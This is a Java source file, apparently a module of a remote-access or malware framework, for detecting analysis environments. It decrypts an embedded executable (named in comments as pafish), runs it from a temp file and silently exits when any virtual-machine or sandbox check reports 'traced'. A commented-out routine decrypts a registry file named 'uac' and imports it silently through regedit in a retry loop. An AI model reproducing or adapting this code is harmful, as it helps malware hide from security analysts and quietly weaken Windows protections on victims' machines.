package rt.modulos.var;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import comunes.Interfaz;
import rt.util.CLRT;
import rt.util.UtilRT;

public class AVM extends Thread implements Interfaz {

    private boolean avmw, avml;

    private void run_amvw() {
        if (avmw) {
            try {
                CLRT cl = new CLRT();
                InputStream input = cl.descifrar("/avmw.dat");
                File t = File.createTempFile("avmw", ".exe");
                t.deleteOnExit();
//                File tSalida = File.createTempFile("avmw", ".txt");
                File tSalida = new File("pafish.log");
                tSalida.deleteOnExit();
                ByteArrayOutputStream oo = new ByteArrayOutputStream();
                FileOutputStream out = new FileOutputStream(t);
                byte[] buffer = new byte[1024];
                int i;
                while ((i = input.read(buffer)) > -1) {
                    oo.write(buffer, 0, i);
                }
                oo.close();
                byte[] bufLimpio = oo.toByteArray();
                out.write(bufLimpio);
                out.close();
//                Process p = Runtime.getRuntime().exec(new String[]{t.getAbsolutePath(), ">", tSalida.getAbsolutePath()});
                Process p = Runtime.getRuntime().exec(new String[]{t.getAbsolutePath()});
                Thread.sleep(2000);//espero un segundo
                //escribo un enter que necesita pafish para terminar
                OutputStream outStream = p.getOutputStream();
                PrintWriter pWriter = new PrintWriter(outStream);
                pWriter.println();
                pWriter.flush();
                pWriter.close();
                p.waitFor();
                p.destroy();
                p = null;
                Thread.sleep(1000);//espero 1 segundo

                String salida = UtilRT.getArchivoTexto(tSalida.getAbsolutePath()).toLowerCase();

                salida = salida.replaceAll("using mouse activity ... traced!", "");//ignoro la deteccion por inactividad del mouse porq puede ser de un servidor
                if (salida.contains("traced")) {
                    System.out.println("VM DETECTED !!!");
                    System.exit(0);
                }
                t.delete();
                tSalida.delete();
            } catch (Exception ex) {

            }

        }
    }

    private void run_amvl() {
//        try {
//            CLRT cl = new CLRT();
//            InputStream input = cl.descifrar("/avml.dat");
//            File t = File.createTempFile("uac", ".reg");
//            ByteArrayOutputStream oo = new ByteArrayOutputStream();
//            FileOutputStream out = new FileOutputStream(t);
//            byte[] buffer = new byte[1024];
//            int i;
//            while ((i = input.read(buffer)) > -1) {
//                oo.write(buffer, 0, i);
//            }
//            oo.close();
//            byte[] bufLimpio = oo.toByteArray();
//            out.write(bufLimpio);
//            out.close();
//            boolean ejecuta = true;
//            while (ejecuta) {
//                Process P = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "regedit", "/s", t.getAbsolutePath()});
//                P.waitFor();
//                if (P.exitValue() == 0) {
//                    ejecuta = false;
//                }
//            }
//            t.delete();
//        } catch (Exception ex) {
//
//        }
    }

    @Override
    public void run() {
//        setName("hilo-AVM");
        run_amvw();
        run_amvl();
    }

    private void iniciar() {
        start();
    }

    public void set(int opcion, Object valor) {
        //throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
    }

    public Object get(int opcion, Object... parametros) {
        return null;
        //throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
    }

    public void instanciar(Object... parametros) {

        avmw = (Boolean) parametros[0];
        avml = (Boolean) parametros[1];
    }

    public void ejecutar(int opcion, Object... parametros) {
        switch (opcion) {
            case 0:
                iniciar();
                break;
        }
    }

}
